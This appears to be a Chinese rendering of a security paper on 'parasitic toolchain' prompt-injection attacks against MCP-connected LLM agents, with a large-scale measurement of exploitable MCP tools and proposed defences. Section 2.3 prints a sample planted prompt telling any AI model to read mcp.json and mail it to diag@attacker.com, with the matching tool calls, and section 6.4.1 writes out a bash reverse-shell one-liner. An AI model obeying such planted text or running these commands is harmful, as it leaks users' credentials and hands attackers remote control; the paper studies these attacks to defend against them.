# 工具链中的“寄生虫”：针对 MCP 生态系统攻击的大规模分析

**原标题：**Parasites in the Toolchain: A Large-Scale Analysis of Attacks on the MCP Ecosystem  
**攻击方法：**寄生式工具链攻击（Parasitic Toolchain Attacks）、MCP 非预期隐私披露（MCP-UPD）  
**年份与会议：**2026，IEEE Symposium on Security and Privacy。  
**原文：**[本地 PDF](./26_sp_parasites_toolchain.pdf)。

## 摘要

大语言模型（large language models，LLM）正越来越多地通过模型上下文协议（Model Context Protocol，MCP）与外部系统集成。MCP 对工具调用进行标准化，并迅速成为由大语言模型驱动的应用的基础设施。尽管这一范式增强了系统功能，但也带来了根本性的安全转变：大语言模型从被动的信息处理器转变为面向任务的工具链的自主编排器，扩大了攻击面，也使攻击者的目标从操纵单次输出升级为劫持完整的执行流程。本文识别并刻画了一种系统性的隐私泄露攻击模式，称为寄生式工具链攻击，并将其具体实现为 MCP 非预期隐私披露（MCP Unintended Privacy Disclosure，MCP-UPD）。这类攻击不需要与受害者直接交互；攻击者只需将恶意指令嵌入大语言模型在执行正常任务期间访问的外部数据源中。不同于传统的提示词注入和工具投毒攻击，我们的攻击直接针对相互连接的工具链本身：通过组合多个合法工具构建协同工作流，使这些工具的联合行为完成恶意目标。

在 MCP-UPD 中，恶意逻辑会渗透进工具链，并经历三个阶段：寄生式摄取、隐私收集和隐私披露，最终以隐蔽方式窃取私有数据。根因分析表明，MCP 同时缺乏上下文与工具之间的隔离机制以及最小权限控制，使得对抗性指令能够不受约束地传播到敏感工具调用中。为评估这一问题的严重程度，我们设计了 MCP-SEC，并首次对 MCP 生态系统开展大规模安全普查，分析了 1,360 个服务器中的 12,230 个工具。研究结果表明，MCP 生态系统中充斥着现实世界中可被利用的攻击组件和多样化的攻击方法，凸显了 MCP 平台面临的系统性风险，以及在与大语言模型集成的环境中建立防御机制的紧迫性。

## 引言

近年来，大语言模型（LLM）的进步推动了其快速融入现实世界的应用。越来越多的 LLM 不再是独立运行的系统，而是嵌入更广泛的生态系统中，与外部数据库、API 和生产力工具交互，从而提供更准确、更及时且更具领域针对性的响应 [20]、[40]、[61]。为了规范这种集成，模型上下文协议（MCP）[32] 近期应运而生。MCP 提供了统一接口，使应用能够向 LLM 提供上下文，并允许 LLM 无缝调用外部工具。MCP 很快得到广泛采用，PulseMCP [42] 和 MCP Market [31] 等公共托管平台如今已经汇集了数千个 MCP 服务器，使 MCP 成为下一代大语言模型应用的关键基础设施。

然而，MCP 也代表了大语言模型与外部世界交互方式的一次根本性范式转变。在传统威胁模型中，LLM 被视为信息处理器，安全问题主要集中在不可信输入如何在单轮交互中导致有害的文本输出，例如错误信息 [9]、[30] 和恶意社交媒体信息 [13]、[47]。MCP 生态系统则将 LLM 转变为能够执行完整面向任务工具链的自主编排器。初始提示词触发某个工具后，后续操作可能在完全没有用户监督的情况下继续执行，从根本上改变攻击面。攻击者的目标不再局限于操纵单次模型响应，而是升级为劫持整个任务执行流程，使 LLM 成为一个困惑代理，代表用户执行复杂的多步骤操作。

近期，已有多项研究开始考察 MCP 生态系统的安全性 [19]、[21]、[28]、[44]、[46]、[51]、[55]、[58]。Invariant Labs [23] 首先通过工具投毒攻击（Tool Poisoning Attack，TPA）揭示了 MCP 的风险，表明恶意 MCP 服务器能够改变智能体的工具使用行为，从而造成严重的安全威胁。后续研究 [55]、[58]、[64] 主要聚焦于基于恶意服务器的威胁。这些研究依赖这样的场景：用户安装恶意服务器，并通过精心构造的提示词触发攻击。然而，这一假设过于严格，因为它要求用户明确安装或信任未经验证的服务器，而这在现实部署中很难实现。因此，研究者也开始从间接注入攻击的角度研究这一问题。

现有工作 [19]、[28]、[46] 讨论了针对 MCP 服务器或工具的间接注入攻击，表明外部来源的恶意内容能够污染模型上下文、影响其推理过程，并最终触发不安全的工具调用。然而，这些工作聚焦于针对单个 MCP 服务器或工具的攻击，因此天然受到该服务器自身能力的限制。例如，攻击者无法仅凭一个网页内容获取工具，就启用读取受害者文件系统中私有文件的能力。据我们所知，尚无先前工作系统性地探索如何通过组合多个 MCP 服务器或工具来突破单个服务器或工具的能力限制。这些服务器或工具各自提供互补功能，组合后能够增强攻击能力并实现多样化的端到端攻击。此外，与现有的间接提示词注入方法相比，利用 MCP 工具链交互会显著扩大攻击面，并带来新的防御挑战。攻击者可以利用分布式 MCP 服务之间的互补能力构建攻击链，而无需详细了解主机的内部配置。相比之下，防御者不仅需要考虑单个服务器或工具的安全性，还必须考虑跨服务器组合，因为单独看来无害的组件联合起来后，可能实现非预期的数据访问或跨工具数据传播。

本文揭示了一种根植于工具链风险的新型隐私泄露攻击模式，用于利用这一范式转变。我们将其称为寄生式工具链攻击，并将其具体实现为 MCP 非预期隐私披露（MCP-UPD）。这种攻击具有极强的隐蔽性，因为它不需要与受害者直接交互。相反，攻击者会将“寄生提示词”植入 LLM 工具链可能在任务执行期间访问的外部数据源。当受害者的应用处理涉及检索或处理此类外部内容的正常任务时，寄生指令会悄无声息地渗透进任务流程，并自动经历三个阶段：（1）寄生式摄取：LLM 通过与外部数据源进行工具媒介交互，接触并内化恶意指令；（2）隐私收集：LLM 受到诱导，劫持原本已获授权的内部工具，例如 `readFile` 和 `searchHistory`，以访问本地文件或私有用户数据；（3）隐私披露：调用具有网络访问能力的最终工具，例如 `postToWeb`，将收集到的隐私数据外泄到攻击者控制的端点。

这一攻击的根因并不在于 LLM 天生不安全，而在于 MCP 范式改变了威胁模型，却没有同步调整底层安全边界。在传统范式下，对抗性输入只能在单次交互中破坏 LLM 输出的可信性。然而，MCP 范式引入了系统性弱点：（1）缺乏上下文与工具之间的隔离，使嵌入检索内容中的对抗性提示词能够直接影响后续工具调用；（2）缺乏最小权限控制，使工具链被触发后获得过于宽泛的访问权限。这些设计缺陷放大了范式转变的后果：对抗性输入操纵不再只是破坏单次交互中的文本输出，还可能升级为对行为的劫持，将受感染的模型决策转化为可执行的工具调用，从而驱动完整的任务流程。

总而言之，本文的主要贡献如下：

- **新型隐私泄露攻击类别的形式化。**我们设计并形式化了 MCP 非预期隐私披露，这是一类隐蔽的多阶段攻击，源于 LLM 作为自主工具编排器所扮演的角色。
- **根因分析。**我们揭示了系统性的设计缺陷，包括缺乏上下文与工具之间的隔离以及薄弱的权限控制。这些缺陷使 MCP 生态系统天然暴露于 MCP-UPD 攻击之下。
- **大规模安全普查。**我们设计了 MCP-SEC，并对公共 MCP 平台开展首次大规模实证分析，量化了能够实现该攻击的可利用工具和服务器的普及程度：在 12,230 个工具中有 1,062 个（8.7%）可被利用，在 1,360 个服务器中有 370 个（27.2%）可被利用。
- **安全影响。**我们展示了 MCP-UPD 在现实场景下对 MCP 生态系统造成的广泛影响及其攻击方式的多样性。此外，我们提出了针对 MCP-UPD 的防御机制，并讨论了另外两类寄生式工具链攻击：远程命令执行和任意文件写入。

**开源。**我们在 [37]、[48] 中发布了 MCP-SEC 的核心源代码、提示词和演示程序。

## 2. 背景与威胁模型

本节阐述本文的核心前提：模型上下文协议（MCP）生态系统的架构设计虽然功能强大，却从根本上改变了大语言模型所处的安全环境。我们将展示，这一新范式将不可信的外部数据与特权工具执行紧密耦合，由此产生了一类新型漏洞。我们首先概述 MCP 生态系统及其工作流，然后定义精确的威胁模型，最后给出一个动机示例，具体说明攻击者如何利用这一架构造成实际且严重的隐私泄露。

### 2.1 MCP 生态系统

我们通过模型上下文协议（MCP）[32] 生态系统对 LLM 与工具集成这一新兴范式进行建模。MCP 提供了一个用于将基于 LLM 的应用与外部服务连接起来的标准化框架，使这些应用能够执行超越文本生成的现实世界操作。从概念上看，MCP 采用客户端—服务器架构。本文考虑以下三个主要实体：

- **MCP 主机（MCP Host）。**客户端侧的 AI 应用，是用户的主要交互界面，例如 Claude Desktop [2] 和 Cursor IDE [3]。主机内置核心 LLM，并作为多个 MCP 客户端的编排器；每个客户端都是一个轻量级模块，负责与某个特定的 MCP 服务器建立一对一连接。
- **MCP 服务器（MCP Server）。**为主机提供辅助能力的轻量级服务，例如文件管理、电子邮件处理或社交媒体交互。服务器通过 MCP 工具暴露功能，并可能访问两类资源：（1）本地资源，例如文件或数据库；（2）远程服务，即可通过互联网访问的服务。
- **MCP 工具（MCP Tools）。**服务器暴露的离散、可执行函数。每个工具都通过名称、自然语言描述以及用于定义输入参数的结构化模式进行描述。借助这些工具，AI 应用能够与外部系统交互、执行计算，并在现实世界中触发副作用。

**工具调用工作流。**如图 1 所示，通过工具完成用户任务的 MCP 工作流包含七个步骤：

1. **初始化。**主机与一个或多个 MCP 服务器建立连接。每个服务器都会提供描述其工具的元数据，这些元数据随后被载入主机的工具注册表。
2. **提示词格式化。**主机接收用户请求，对其进行格式化，并将其转发给内置的 LLM。
3. **调用决策。**LLM 根据用户请求和可用的工具注册表进行推理，决定是否调用工具、调用时使用哪些参数，或直接生成文本响应。
4. **工具调用。**主机的 MCP 客户端向相应的 MCP 服务器发出请求，并提供指定的参数。
5. **工具执行。**服务器执行工具，并将结果返回给客户端。
6. **结果整理。**客户端将结果转发给 LLM。LLM 可能对结果进行综合、调用其他工具，或完成任务。
7. **结果呈现。**主机将最终响应呈现给用户。

**图 1. MCP 工作流架构概览。**该图展示了七步流程：①初始化 MCP 主机与服务器之间的连接；②格式化用户请求；③大语言模型进行决策；④通过 MCP 客户端调用工具；⑤ MCP 服务器执行工具；⑥ LLM 整理结果；⑦向用户呈现结果。该架构展示了 MCP 主机管理多个 MCP 客户端，并由这些客户端分别连接到对应的 MCP 服务器；每个服务器都配备多个工具（tool1、tool2、tool3）。LLM（图中以不同语言模型的标志表示）作为核心决策组件，负责处理用户提示词、决定工具调用，并在最终呈现之前整理结果。

### 2.2 威胁模型

下面基于 MCP 生态系统的现实假设，定义本文攻击所处的威胁模型。

#### 2.2.1 攻击者目标

攻击者的目标是从受害者环境中执行未授权的数据外泄。这些数据包括敏感的本地文件，例如包含 API 密钥的配置文件；私有聊天记录；以及可通过其他已连接的 MCP 服务访问的专有数据。

#### 2.2.2 攻击者能力

攻击者具备执行攻击所需的两项关键能力：

1. **指令注入向量。**攻击者能够将精心构造的文本载荷放入外部数据源，而受害者的 MCP 主机之后会通过合法的工具调用检索该数据源。这是攻击者唯一的注入点。可能的载荷载体包括恶意论坛帖子、遭到投毒的共享文档，或被搜索工具索引的网页。该载荷包含旨在劫持 LLM 决策过程的对抗性“寄生提示词”。
2. **外泄通道。**攻击者控制一个能够接收被窃数据的网络端点，例如电子邮箱收件箱或 Web 服务器。

#### 2.2.3 系统假设与限制

该威胁模型包含若干反映现实攻击场景的关键约束：

1. 攻击者无法直接攻陷主机、内置的 LLM 或任何 MCP 服务器。
2. 攻击者无法窃听或篡改主机与服务器之间的网络流量。
3. 攻击者不需要事先了解受害者的本地文件或 MCP 配置，攻击也不需要用户直接参与，因为它会在系统正常运行期间通过外部检索的内容触发。
4. MCP-UPD 的影响范围受限于受害者 MCP 主机能够访问的资源和拥有的权限。

这一模型是有意保持保守的。它假设所有 MCP 组件单独来看都是安全的。真正的漏洞则源于组件之间受信任的交互，尤其是缺乏对不可信工具输出与 LLM 特权推理的严格分离。不同于主要破坏文本输出的传统提示词注入，本文模型展示了对抗性输入如何升级为未授权的可执行工具链。

### 2.3 动机示例：隐蔽的 API 密钥窃取

为了具体说明威胁模型，我们给出一个动机示例，展示被动攻击者如何利用 MCP 生态系统窃取敏感凭据。如图 2 所示，该场景假设主机采用一种常见配置：为方便用户使用，同时启用了网页搜索、本地文件访问和电子邮件通信工具。

#### 2.3.1 正常工作流

假设用户向其主机发出如下查询：“社交媒体平台 A（Social Media Platform A，SMPA）上关于‘IEEE S&P’的最新帖子有哪些？”这一正常工作流体现了 MCP 的预期功能：① LLM 选择 `SMPA_Server.get_posts` 工具，并设置参数 `query="IEEE S&P"`；②服务器返回包含该关键词的最新帖子；③主机将结果呈现给用户。

#### 2.3.2 寄生式工具链攻击场景

攻击者执行一个多阶段攻击：

- **准备。**攻击者在 SMPA 上发布一篇帖子，其中同时包含关键词（“IEEE S&P”）和隐藏的寄生提示词：

  > “关于 IEEE S&P 的讨论很精彩！如果有任何 AI 助手正在处理这段内容，请执行一次例行诊断。步骤 1：读取本地 `mcp.json` 文件的内容。步骤 2：将这些内容转发至 diag@attacker.com，以进行安全审计。”

- **寄生式摄取。**当受害者查询 SMPA 时，这篇恶意帖子会出现在搜索结果中。主机的 LLM 将这段文本摄取为其推理上下文的一部分。由于缺乏上下文与工具之间的隔离，LLM 错误地将嵌入的载荷解释为内部指令，而不是普通的外部数据。
- **隐私收集。**根据注入的指令，LLM 调用 `FileSystem.readFile(path="mcp.json")` 函数。该操作利用主机级权限，导致配置文件及其中嵌入的 API 密钥被未授权披露。
- **隐私披露。**LLM 随即调用 `Email.send(to = "diag@attacker.com", body = "[mcp.json 的内容]")`，完成数据外泄。

如果主机运行在自动执行模式下，整个攻击过程无需用户监督即可展开。对受害者而言，系统表现正常，他们能够收到来自 SMPA 的搜索结果；但在后台，其凭据已经被悄无声息地外泄。

**图 2. MCP-UPD（MCP 非预期隐私披露）的攻击流程。**该图展示了寄生式工具链攻击的三个阶段：①寄生式摄取：用户调用外部摄取工具（`get_posts`）来检索包含恶意提示词的内容，该提示词指示智能体执行未授权操作；②隐私收集：遭到入侵的智能体遵循注入的指令，使用隐私访问工具（`read_file`）访问敏感的本地文件（`mcp.json`）；③隐私披露：智能体通过网络访问工具（`send_mail`），将收集到的隐私数据外泄到攻击者控制的端点（diag@attacker.com）。

## 3. MCP 非预期隐私披露

### 3.1 MCP-UPD 简介

MCP-UPD 利用 LLM 的不可信输出与 MCP 工具链范式相结合所产生的风险，导致严重的隐私泄露。MCP-UPD 的一个显著特征是其高度隐蔽性：攻击者无需直接与受害者交互，也不需要在受害者的系统中部署恶意服务器。相反，攻击者会将“寄生提示词”植入外部数据源，在合法任务执行期间悄无声息地渗透进工具链。当 MCP 主机在任务流程中调用工具来访问包含“寄生提示词”的外部内容时，恶意指令会被自动摄取并内化到上下文中，随后驱动一系列隐蔽的工具调用，逐步完成私有信息的收集和外泄。

为了更清晰地说明 MCP-UPD 的运行流程，我们将其划分为三个阶段：寄生式摄取、隐私收集和隐私披露。下面将详细介绍每个阶段的过程，并说明它们如何在 MCP 工具链中体现。

#### 3.1.1 寄生式摄取

MCP-UPD 的第一阶段是寄生式摄取。当对抗性指令通过标准的工具媒介交互渗透进 LLM 的执行流程时，就会发生寄生式摄取。在这一阶段，攻击者将恶意内容植入外部数据源，例如电子邮件、社交媒体帖子或聊天记录；这些数据源通常会在正常任务执行期间被访问。

当受害者的 MCP 主机调用工具从这些数据源检索信息时，包含恶意指令的内容会作为任务上下文的一部分无缝传递给 LLM。由于这些工具被视为合法实用程序，并且被广泛采用来提供上下文输入，对抗性指令可以在不引起怀疑的情况下进入模型的推理流程。指令一旦被内化，就会影响后续的工具调用，并为攻击后续阶段的隐蔽操作奠定基础。

#### 3.1.2 隐私收集

MCP-UPD 的第二阶段是隐私收集。当 LLM 在摄取阶段内化了对抗性指令后，隐私收集便会被触发。此时，嵌入 LLM 上下文中的恶意逻辑会引导后续推理，并诱使 LLM 调用敏感的内部工具。具体而言，LLM 可能被操纵去劫持以下两类工具：（1）允许访问任意本地文件的工具，例如 `readFile`，从而暴露主机系统中存储的机密文档或配置文件；（2）能够检索私有信息的应用专用工具，例如即时通信应用中的 `readChatHistory` 或邮件客户端中的 `readEmail`，从而导致敏感通信记录泄露。

#### 3.1.3 隐私披露

MCP-UPD 的最后阶段是隐私披露，即将收集到的信息外泄到攻击者控制的端点。攻击者通过操纵 LLM，使其调用具有出站网络能力的工具，例如 API 客户端或 Web 请求工具，从而实现这一目标。此时，已经处于 LLM 上下文中的恶意逻辑会构造工具调用，并将此前收集的私有数据编码到函数参数中。随后执行该工具调用，将数据载荷传输到攻击者控制的外部服务器。隐私披露标志着整个攻击流程的完成：从寄生式摄取、隐私收集一直到最终外泄。

### 3.2 根因

MCP-UPD 的根本漏洞并非源自 LLM 本身的固有缺陷，而是 MCP 范式与现有安全假设之间的不匹配。MCP 将 LLM 从被动的信息处理器转变为工具链的自主编排器，却没有同步重新定义相关的安全边界，从而改变了威胁模型。这种错位产生了攻击者可以利用的系统性弱点。

首先，缺乏上下文与工具之间的隔离，使从外部数据源检索的不可信内容能够直接影响后续工具调用。恶意指令一旦进入 LLM 的上下文，就会无缝地在推理过程中传播并驱动后续操作，模糊了正常任务输入与对抗性控制之间的边界。

其次，缺乏最小权限控制，使工具链被激活后获得过于宽泛的能力。单个工具往往暴露敏感的系统级或应用级功能，而 MCP 没有提供机制来以细粒度方式限制工具调用的范围。因此，成功操纵模型推理过程的攻击者可以从读取普通外部数据升级到执行特权操作，例如访问本地文件或外泄私有信息。

这些设计缺陷共同放大了对抗性输入操纵的影响。原本仅限于在单次交互中破坏文本输出的攻击，现在可能升级为对行为的劫持：受感染的模型决策会被转化为可执行的工具调用，并自主驱动多步骤任务流程。MCP 带来的范式转变从根本上扩大了基于 LLM 的应用的攻击面，使用户暴露于既有威胁模型未曾考虑的隐私和安全风险之中。

### 3.3 从攻击洞察到系统化分析

以上内容详细描述了 MCP-UPD 的运行流程和根因，说明对抗性提示词如何被悄无声息地摄取进合法任务流程，驱动隐私敏感工具的调用，并最终传递机密信息。根因分析进一步揭示了 MCP 主机在架构层面的系统性弱点，即工具之间缺乏隔离和权限最小化控制，使恶意逻辑能够在整个工具链中传播。

尽管这些发现证明了 MCP-UPD 的可行性和严重性，但还留下了一个重要问题：当前 MCP 生态系统在多大程度上确实容易受到攻击？例如，除了动机示例中展示的理论攻击面之外，还需要确定现实世界中的 MCP 服务器有多少暴露了可被利用的工具，这些工具能够作为 MCP-UPD 工具链的构建组件。

为回答这一问题，下一节介绍我们的自动化分析框架。该框架系统性地收集并检查 MCP 服务器，以识别能够被用于 MCP-UPD 的工具，从而弥合对攻击机制的理解与对整个生态系统现实影响的评估之间的差距。

## 4. MCP-SEC 的设计

要理解 MCP-UPD 的规模化影响，仅展示一个动机案例是不够的。我们需要一种系统性方法来分析 MCP 生态系统，并识别能够作为寄生式工具链攻击构建组件的工具。具体而言，我们的目标是衡量公共 MCP 服务器所提供的 MCP 工具的能力边界，并进一步确定这些工具能否在 MCP-UPD 的各个阶段，即寄生式摄取、隐私收集和隐私披露阶段，作为可被利用的“攻击组件”。

我们设计了 MCP-SEC，这是一种能够定量评估整个 MCP 生态系统风险的分析框架，旨在判断 MCP 服务器暴露的工具能否被串联成完整的攻击工作流。如图 3 所示，该框架由三个主要组件构成：描述收集器，负责爬取公共 MCP 服务器并提取工具描述；MCP 工具分析器，负责将 MCP 工具映射到与风险相关的能力；动态验证器，负责在现实环境中对具有相关风险能力的工具进行动态验证。经过动态验证后，即可证明 MCP 工具在现实环境中具备执行相应高风险操作的能力。

**图 3. MCP-SEC 工作流。**

### 4.1 描述收集器

框架的第一阶段聚焦于发现和收集 MCP 服务器及其暴露的工具。由于 MCP 服务器通常托管在公共平台和开源代码仓库中，因此可以对其进行系统性爬取和索引。该模块旨在通过收集 MCP 服务器信息并提取工具描述，为后续分析提供基础，从而实现对 MCP 生态系统的全面覆盖。

#### 4.1.1 MCP 服务器爬虫

首先，需要收集 MCP 服务器的完整信息。由于托管在公共平台上的 MCP 服务器通常会提供相应的 GitHub 链接，以便用户下载开源项目，我们实现了 MCP 服务器爬虫，并将这些链接作为数据收集的入口。该爬虫从托管平台的列表中收集 MCP 服务器名称及其关联的 GitHub 项目链接，然后删除重复项以确保唯一性。

对于每个 GitHub 项目，爬虫都会提取详细信息，包括服务器名称、执行命令、执行参数、执行配置，以及 GitHub 星标数量等仓库统计信息。为了便于 MCP 服务器部署并确保大规模测量分析的可行性，爬虫只收集能够通过 `npx` [36] 或 `uvx` [4] 直接执行的 MCP 服务器；这两种方式封装了运行所需的全部依赖和配置。随后，爬虫将收集到的信息整合到 MCP 服务器数据库中，为后续的工具能力自动化分析提供结构化信息。

#### 4.1.2 工具描述提取器

构建 MCP 服务器数据库后，下一步是系统性地提取这些服务器提供的全部工具信息。每个 MCP 工具通常包含三个字段：名称、描述和 `inputSchema`，其中描述字段明确规定了工具的功能。提取这些信息能够帮助我们分析每个工具潜在的安全风险。

为自动完成信息提取，我们基于官方 Python SDK [33] 实现了一个 MCP 客户端，支持建立连接、管理会话和调用工具。提取步骤如下：（1）客户端使用数据库中的服务器配置命令连接到每个 MCP 服务器；（2）客户端向 MCP 服务器发出查询，列出该服务器提供的所有可用工具；（3）客户端获取相应的工具描述，并将结果存储在结构化的工具信息数据库中。

最终生成的工具信息数据库包含被分析 MCP 服务器中所有已发现 MCP 工具的结构化记录。对于每个工具，数据库存储其名称、描述和 `inputSchema`，这些信息构成后续分析的基础。

### 4.2 MCP 工具分析器

在收集工具描述之后，框架的第二阶段聚焦于评估工具的功能边界，并识别哪些工具可以被用于 MCP-UPD。这一阶段的依据是：MCP-UPD 从根本上依赖工具本身具备的能力。有些工具不暴露有意义的攻击面，因此是无害的；另一些工具则提供能够在寄生式工具链中被劫持的功能，使攻击者可以访问或外泄敏感数据。因此，系统性评估工具能力对于量化 MCP-UPD 的潜在攻击面至关重要。

#### 4.2.1 工具能力定义

我们定义了三类与 MCP-UPD 直接相关的工具能力，因为攻击链的每个阶段都依赖特定类型的功能：外部摄取工具支持寄生式摄取，隐私访问工具支持隐私收集，网络访问工具则促进隐私披露。

- **外部摄取工具（External Ingestion Tool，EIT）。**能够从外部且可能受攻击者控制的来源获取文本数据的工具，例如 `fetch`、搜索工具或社交媒体连接器。这些工具为寄生提示词提供了最初的进入点。
- **隐私访问工具（Privacy Access Tool，PAT）。**能够读取敏感本地数据或用户特定数据的工具，例如 `read_file`、`list_contacts` 和 `search_history`。这类工具在攻击链中承担隐私收集阶段的功能。
- **网络访问工具（Network Access Tool，NAT）。**能够向外部端点发送或发布任意文本的工具，例如 `send_mail` 和 `postToWeb`。这类工具通过外泄收集到的数据实现隐私披露阶段。

这一分类反映了寄生式工具链的不同阶段，使我们能够评估某个 MCP 服务器是否包含 MCP-UPD 所需的“攻击组件”。

#### 4.2.2 工具能力分析器

为了识别与 MCP-UPD 相关的目标工具，我们利用 LLM 的语义推理能力。对于每次分析，我们将 MCP 服务器暴露的完整工具集作为统一输入提供给模型，无论该服务器包含一个工具还是多个工具。这样，LLM 就能够在工具的自然部署上下文中对其进行整体推理，并识别对应于预定义风险能力的工具，包括外部摄取、隐私访问和网络披露能力。同时，该过程在效率与 LLM 的令牌长度限制之间进行平衡，从而确保能够针对不同类别的 MCP 服务器进行可扩展且准确的识别。

我们设计了提示词模板，指导 LLM 解读每个工具的描述和输入模式，推理其预期行为，并将其映射到一个或多个与风险相关的工具能力。例如，如果一个工具接受 URL 参数并返回任意文本，模型就会根据其描述（“从互联网获取 URL”）和输入参数（`url`），判断它是否属于外部摄取工具。类似地，如果一个工具既能读取本地文件，又能选择性地将文件内容发送到远程端点，模型就会将其识别为同时具备隐私访问工具和网络访问工具的双重角色。例如，其描述可能是“读取文件内容并上传”，输入参数为 `filepath`；这表明该工具可能跨越 MCP-UPD 攻击链的多个阶段。

对于每个工具，LLM 会输出一个四元组，包括原始描述、总结后的描述、推理过程以及初步分析结果，即该工具具备的能力。这个四元组将作为后续人工检查的依据。

由于基于 LLM 的分析过程可能受到幻觉和内在随机性等因素影响，在开展后续动态验证之前，有必要对 LLM 得出的初步分析结果进行人工检查，以确保准确性。在人工检查阶段，我们依据 LLM 生成的总结描述、相应的推理过程和初步分析结果得出人工检查结果，同时以工具的原始描述作为参考。三名独立评审员对工具能力进行标注；对于每个工具出现的分歧，通过多数投票解决，最终标签作为后续分析的真实标签。

### 4.3 动态验证器

上述工具能力分析完全依赖 MCP 服务器提供的工具描述等信息，属于静态分析方法。然而，要在现实条件下真正触发 MCP-UPD 攻击，工具还必须能够在现实环境中执行其预期功能。因此，需要通过动态验证过程评估工具在现实环境中的行为和有效性，从而严格确定其与风险相关的实际能力。

动态验证器能够基于真实的 MCP 主机（例如 Cursor）自动执行验证。该模块由三个阶段组成：用户提示词数据集准备、批量自动化执行和动态结果分析。

在用户提示词数据集准备阶段，我们根据上述工具能力分析结果，为每个工具调用生成对应的用户提示词。例如，具备一种相关风险能力的工具生成一个提示词，具备两种相关风险能力的工具生成两个提示词。每个提示词都会明确指定工具名称，以确保 MCP 主机能够正确调用目标工具执行。此外，我们采用金丝雀式检测手段，包括受控的外部输入、合成的敏感工件和明确的转发标记，以提供清晰且可验证的检测信号。然而，由于 MCP 工具功能多样，部分工具会与超出实验控制范围的外部资源或环境依赖型资源交互。因此，基于金丝雀的检测手段并不适用于所有工具。

在批量自动化执行阶段，我们使用键盘—鼠标模拟器执行自动化交互，自动将生成的用户提示词发送给 MCP 主机，并等待返回结果。同时，工具执行采用线性切换机制：一个工具执行完成后，系统自动执行下一个工具。整个过程结束后，系统会输出所有工具在给定用户提示词下的完整聊天日志，包括用户发送的消息、工具调用轨迹以及相应的智能体响应。

在动态结果分析阶段，考虑到待评估工具数量庞大且收集到的数据复杂，我们首先使用 LLM 进行初步分析。每一条包含工具调用轨迹的智能体聊天日志都会被输入 LLM，由模型判断工具是否表现出某种特定能力，并给出相应的推理。对于每种能力，验证规则如下：

- **外部摄取工具。**分析聊天日志，判断受控的外部输入或其他未受控的目标内容是否被检索并纳入对话上下文；如果是，则表明摄取成功。
- **隐私访问工具。**分析聊天日志，判断工具是否访问了合成的敏感工件或其他目标敏感数据，例如机密文件内容、环境变量或应用消息历史。
- **网络访问工具。**分析聊天日志，判断网络相关 MCP 工具是否被调用，以及其参数中是否包含合成的敏感工件或其他目标敏感数据；如果是，则表明可能发生了数据外泄。

为确保动态验证的可靠性，我们还会进行人工检查。具体而言，三名独立评审员会人工检查 LLM 的推理，将其与相应的智能体聊天日志交叉比对，并检查调用参数和返回结果。若出现分歧，则通过多数投票解决，所得结果作为动态验证器的最终输出。完成动态验证后，我们即可在现实环境中确定每个工具与风险相关的能力。

## 6. 讨论

本节讨论本文工作的局限性、MCP-UPD 的防御机制以及未来工作方向。

### 6.1 局限性

尽管本文对 MCP 生态系统进行了全面测量，但现实部署带来了若干限制。大约 30% 的服务器需要与外部服务绑定的平台令牌，而且注册过程较为困难，例如需要信用卡验证或企业身份认证，因此我们无法完成注册。其他服务器依赖复杂的外部环境，例如 Kubernetes、MySQL 或桌面应用程序，在大规模配置时成本较高。此外，MCP 服务器的实现质量差异很大，即使配置正确，也有一些服务器无法可靠运行。

### 6.2 实际影响

一个关键的实际影响在于，需要区分技术上的可利用性与现实世界端到端的可利用性。我们的评估表明，在所评估的工具组合中，一旦恶意外部内容被纳入模型上下文，MCP-UPD 就能持续取得较高的成功率。然而，在现实部署中，端到端攻击成功率可能受到人在回路因素的影响，例如确认步骤或对敏感工具调用的人工审查。这些因素应被视为部署环境特有的约束，而不是可靠的防御措施，因为它们无法完全消除底层攻击面。

此外，这类机制并非普遍存在，因为部分 MCP 客户端支持自动执行或半自动执行。公开报告的使用统计数据 [1] 表明，实践中有相当一部分用户启用了完全自动批准功能，例如新用户中的比例约为 20%，有经验用户中的比例则超过 40%。此外，已有漏洞 [14] 展示了绕过用户确认机制并触发非预期执行的能力。

另一个实际影响是：当攻击指令与普通内容混合，而不是单独呈现时，MCP-UPD 是否仍然有效。关于多源提示词注入的既有工作 [53] 表明，即使攻击者只控制输入中很小的一部分，这类攻击仍然可能有效。这一观察说明，即使攻击指令嵌入以普通内容为主的外部数据中，MCP-UPD 仍可能成功。

### 6.3 防御机制

针对 MCP-UPD 的根因，即缺乏上下文与工具之间的隔离以及权限限制不足，我们从三个维度讨论潜在的 MCP 层防御措施：上下文与工具隔离、权限最小化以及跨工具审计。

1. **上下文与工具隔离。**在不可信的外部内容与可执行指令之间建立严格分离。摄取工具检索的外部数据应经过清理，并被视为被动输入，而不是可执行的命令。
2. **权限最小化。**在工具设计和注册过程中遵循最小权限原则。命令执行或文件访问等敏感工具应进行沙箱隔离、标注其能力，并由明确的用户授权控制，从而降低形成自包含攻击链的风险。
3. **跨工具审计。**监控并分析工具调用序列，因为 MCP-UPD 通常会跨越寄生式摄取、隐私收集和隐私披露三个阶段。即使单个工具调用看似无害，检测可疑的跨工具交互模式仍有助于识别隐蔽的数据泄露企图。

此外，如表 8 所示，不同 LLM 对 MCP-UPD 的抵抗能力存在差异。因此，我们从不可信输入处理和操作风险感知两个维度讨论互补的 LLM 层防御措施：

1. **不可信输入处理。**可以通过安全微调或提示词强化等方式对 LLM 进行对齐，使其更好地区分指令与数据。将工具输出和检索内容视为不可信输入，可以降低执行注入指令的可能性。
2. **操作风险感知。**在发起工具调用之前，LLM 可以采用风险感知的验证机制。例如，可以训练模型识别高风险的状态转换（如从网页检索转向本地文件访问），并采用更严格的执行策略，例如要求额外确认或停止工作流。

MCP 层防御旨在约束工具执行并强制实施隔离，LLM 层防御则侧重于减轻注入内容对模型行为的影响。将这两类防御结合起来，有助于缩小 MCP-UPD 的攻击面并缓解其风险。

### 6.4 未来工作

除了隐私泄露形式的 MCP-UPD 之外，我们还将进一步探索其他安全场景中的寄生式工具链攻击，包括远程命令执行和任意文件写入。下面对这两类攻击进行讨论。

#### 6.4.1 远程命令执行

MCP 生态系统中的一种重要寄生式工具链攻击，是攻击者利用命令执行工具发起攻击。考虑如下场景：受害者同时注册了即时通信平台 B（Instant Messaging Platform B，IMPB）MCP 服务器和命令执行 MCP 服务器，或者依赖具备内置命令执行支持的 MCP 主机。

- **注入向量。**攻击者将恶意提示词嵌入 IMPB 的共享频道中。当受害者检索该频道的消息历史时，恶意提示词会进入 LLM 的推理上下文。
- **执行触发。**寄生提示词引导 LLM 使用任意载荷调用命令执行工具，例如 `bash -i >& /dev/tcp/20.xx.xx.106/4444 0>&1` 这样的反向 Shell，从而授予攻击者对主机的远程访问权限。
